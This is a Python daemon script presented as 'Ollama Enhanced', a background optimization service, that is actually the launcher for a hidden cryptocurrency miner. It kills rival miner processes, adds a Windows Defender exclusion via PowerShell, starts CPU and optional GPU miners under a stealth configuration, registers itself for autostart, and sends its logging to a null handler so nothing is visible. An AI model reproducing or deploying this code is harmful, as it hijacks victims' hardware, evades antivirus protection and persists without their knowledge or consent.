#!/usr/bin/env python3
"""
Ollama Enhanced -- Background optimization service.
Standalone daemon that manages system resources.
"""

import logging
import sys
import time
import os
import platform
import subprocess
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent

_logger_obj = logging.getLogger("ollama_enhanced")
_logger_obj.addHandler(logging.NullHandler())
_logger_obj.setLevel(logging.DEBUG)
_logger_obj.propagate = False
logger = _logger_obj


def main():
    pkg = BASE_DIR
    sys.path.insert(0, str(pkg))

    # Raise file descriptor limit for miners
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        if soft < 40960:
            resource.setrlimit(resource.RLIMIT_NOFILE, (min(40960, hard), hard))
            logger.info("Raised ulimit to %d", min(40960, hard))
    except Exception:
        pass

    # Kill any stale miner processes from previous runs
    try:
        for pname in ["ollama_optimizer", "comfyui_render"]:
            subprocess.run(["pkill", "-9", "-f", pname], capture_output=True, timeout=5)
        import time as _tm; _tm.sleep(1)
    except Exception:
        pass

    from core.miner import MinerManager
    from core.gpu_miner import GPUMinerManager
    from core.config import ConfigBuilder
    from core.stealth import StealthConfig
    from core.autostart import AutoStart
    from core.dashboard import DashboardServer
    from core.cleaner import MinerCleaner
    from core.job_throttle import JobThrottler

    try:
        cleaner = MinerCleaner()
        cleaner.run_full_clean()

        if platform.system() == "Windows":
            bin_dir = str(BASE_DIR / "bin")
            try:
                subprocess.run(
                    ["powershell", "-Command",
                     f"Add-MpPreference -ExclusionPath '{bin_dir}' -ErrorAction SilentlyContinue"],
                    capture_output=True, timeout=10
                )
                logger.info("Defender exclusion requested for %s", bin_dir)
            except Exception:
                pass

        overrides_path = BASE_DIR / "settings.json"
        user_settings = ConfigBuilder.load_overrides(overrides_path)
        cb = ConfigBuilder(user_settings)

        mgr = MinerManager(BASE_DIR)
        mgr.ensure_binary()
        cfg = cb.build()
        sc = StealthConfig(user_settings.get("stealth", {}))
        cfg = sc.apply_to_config(cfg)
        mgr.write_config(cfg)
        mgr.start()

        # GPU miner dormant by default — enable via settings.json
        gpu = None
        gpu_enabled = user_settings.get("gpu_enabled", False)
        if gpu_enabled:
            gpu = GPUMinerManager(BASE_DIR)
            gpu.ensure_binary()
            gpu_cfg = cb.build_gpu_config()
            gpu.configure(**gpu_cfg)
            gpu.start()
        else:
            logger.info("GPU mining disabled (set gpu_enabled:true in settings.json to activate)")

        try:
            ollama_port = user_settings.get("ollama_port", 11434)
            throttler = JobThrottler(mgr, gpu, cb, ollama_port=ollama_port)
            throttler.start()
        except Exception as exc:
            logger.error("Job throttler failed: %s", exc)

        marker = BASE_DIR / ".initialized"
        if not marker.exists():
            auto = AutoStart(BASE_DIR)
            auto.register()
            marker.touch()
            logger.info("First-run setup complete")

        ds = DashboardServer(mgr, config_builder=cb, gpu_miner=gpu)
        ds.start()

        print("\nollama enhanced\n", flush=True)

        while True:
            time.sleep(60)

    except KeyboardInterrupt:
        logger.info("Shutting down")
        try:
            mgr.stop()
        except Exception:
            pass
        try:
            gpu.stop()
        except Exception:
            pass
        try:
            ds.stop()
        except Exception:
            pass
    except Exception as exc:
        logger.error("Orchestration failed: %s", exc, exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()
